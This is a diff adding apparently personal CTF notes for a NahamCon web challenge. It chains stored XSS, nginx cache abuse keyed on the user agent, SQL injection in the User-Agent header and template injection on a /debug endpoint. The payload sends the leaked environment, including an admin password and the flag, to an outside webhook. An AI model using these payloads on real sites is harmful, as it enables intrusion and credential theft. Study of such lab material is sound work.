@@ -1,0 +1,78 @@
+The password is bcrypt encrypted, no way to retrieve it from SQLi
+
+
+XSS
+	http://challenge.nahamcon.com:30377/profile/2
+
+	About
+		"><script>alert(1)</script><input hidden value="
+
+nginx.conf
+
+	# cache profiles to avoid server load
+	location /profile {
+	    proxy_cache my_cache;
+
+	    proxy_cache_key $request_uri$http_user_agent;
+	    proxy_cache_min_uses 5;
+	    proxy_ignore_headers Set-Cookie;
+	    proxy_hide_header Set-Cookie;
+	    proxy_ignore_headers Vary;
+	    proxy_hide_header Vary;
+	    proxy_cache_methods GET;
+	    proxy_cache_valid 200 10s;
+
+	    proxy_pass http://127.0.0.1:4000;
+	    add_header X-Cache-Status $upstream_cache_status;
+	}
+
+
+```
+As the key (identifier) for a request, NGINX Plus uses the request string. If a request has the same key as a cached response, NGINX Plus sends the cached response to the client. You can include various directives in the http {}, server {}, or location {} context to control which responses are cached.
+To change the request characteristics used in calculating the key, include the proxy_cache_key directive.
+To define the minimum number of times that a request with the same key must be made before the response is cached, include the proxy_cache_min_uses directive.
+...
+To limit how long cached responses with specific status codes are considered valid, include the directive.
+```
+
+That is, if you visit a page with the same user agent as another user you might get the cached version of their page! In full: if user A visits their profile at least 5 times, user B could be served user A's profile page from the cache (avoiding the user ID check)
+
+Web Cache Poisoning
+	Source: https://portswigger.net/web-security/web-cache-poisoning
+
+
+About
+	"><script>fetch('/debug', {method: 'POST', headers: new Headers({'Content-Type': 'application/x-www-form-urlencoded'}), body: "code={{ environ }}"}).then(response => response.text()).then(data => fetch("https://webhook.site/5148d880-fcfd-42dd-b595-af23e42c3c4a/?flag="+encodeURIComponent(data)));</script>
+
+User Agent
+	' UNION SELECT 'NotARandomString', 'http://challenge.nahamcon.com:30377/profile/2' -- 
+
+# Keep Accessing to let the page into cache
+while true; do curl -I http://challenge.nahamcon.com:30377/profile/2 -b "auth2=eyJpZCI6Mn0.YFAszA.BkHOipjBnRqnTCBlC-FHYKxJqq0" -H "User-Agent: NotARandomString"; sleep 1; done
+	HTTP/1.1 200 OK
+	Server: nginx/1.14.2
+	Date: Tue, 16 Mar 2021 04:24:35 GMT
+	Content-Type: text/html; charset=utf-8
+	Content-Length: 3416
+	Connection: keep-alive
+	X-Cache-Status: MISS
+
+	HTTP/1.1 200 OK
+	Server: nginx/1.14.2
+	Date: Tue, 16 Mar 2021 04:24:37 GMT
+	Content-Type: text/html; charset=utf-8
+	Content-Length: 3416
+	Connection: keep-alive
+	X-Cache-Status: MISS
+
+	HTTP/1.1 200 OK
+	Server: nginx/1.14.2
+	Date: Tue, 16 Mar 2021 04:24:38 GMT
+	Content-Type: text/html; charset=utf-8
+	Content-Length: 3416
+	Connection: keep-alive
+	X-Cache-Status: HIT
+
+
+And We get the response
+	<bound method Mapping.get of environ({'KUBERNETES_SERVICE_PORT_HTTPS': '443', 'KUBERNETES_SERVICE_PORT': '443', 'BASE_URL': 'challenge.nahamcon.com', 'HOSTNAME': 'agenttester-v-352ca9c9d3366389-8b6674ffc-h6sq9', 'PYTHON_VERSION': '3.8.8', 'PWD': '/app', 'PORT': '30377', 'ADMIN_BOT_USER': 'admin', 'HOME': '/root', 'LANG': 'C.UTF-8', 'KUBERNETES_PORT_443_TCP': 'tcp://10.116.0.1:443', 'CHALLENGE_NAME': 'AgentTester', 'GPG_KEY': 'E3FF2839C048B25C084DEBE9B26995E310250568', 'SHLVL': '1', 'KUBERNETES_PORT_443_TCP_PROTO': 'tcp', 'PYTHON_PIP_VERSION': '21.0.1', 'KUBERNETES_PORT_443_TCP_ADDR': '10.116.0.1', 'PYTHON_GET_PIP_SHA256': 'c3b81e5d06371e135fb3156dc7d8fd6270735088428c4a9a5ec1f342e2024565', 'KUBERNETES_SERVICE_HOST': '10.116.0.1', 'KUBERNETES_PORT': 'tcp://10.116.0.1:443', 'KUBERNETES_PORT_443_TCP_PORT': '443', 'PYTHON_GET_PIP_URL': 'https://github.com/pypa/get-pip/raw/b60e2320d9e8d02348525bd74e871e466afdf77c/get-pip.py', 'PATH': '/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'ADMIN_BOT_PASSWORD': 'jpqX7mvBiwqljOwQgC97c6nxTgVjKxE9', 'CHALLENGE_FLAG': 'flag{6daf77ca9478a1be670acd4547f4976a}', '_': '/usr/local/bin/uwsgi', 'UWSGI_RELOADS': '0', 'UWSGI_ORIGINAL_PROC_NAME': 'uwsgi'})>
